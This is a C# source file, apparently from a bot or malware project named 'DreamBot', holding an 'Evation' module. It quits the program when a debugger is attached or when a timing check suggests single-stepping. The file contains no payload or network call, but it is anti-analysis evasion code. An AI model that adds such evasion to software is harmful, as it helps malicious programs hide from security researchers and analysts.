using System;
using System.Diagnostics;
using System.Threading;
using DreamBot.Workers;

namespace DreamBot.System.Evation
{
    static class AntiDebugging
    {
        private static DateTime _last = DateTime.MinValue;
        private static readonly ClientWorker _worker = new ClientWorker();

        static AntiDebugging()
        {
            _worker.QueueForever(CheckDebugging, TimeSpan.FromSeconds(0.3));
            _worker.Start();
            
        }

        public static void CheckDebugging()
        {
            if(_last.CompareTo(DateTime.MinValue) == 0 )
            {
                _last = DateTime.UtcNow;
                return;
            }
            var elapsed = DateTime.UtcNow - _last;
            if(elapsed.TotalMilliseconds > 350)
            {
#if !DEBUG
                Environment.Exit(0);
#endif
            }
            _last = DateTime.UtcNow;
        }

        public static void CheckDebugger()
        {
            if(Debugger.IsAttached || NativeMethods.IsDebuggerPresent())
            {
#if !DEBUG
                Environment.Exit(0);
#endif
            }
        }
    }
}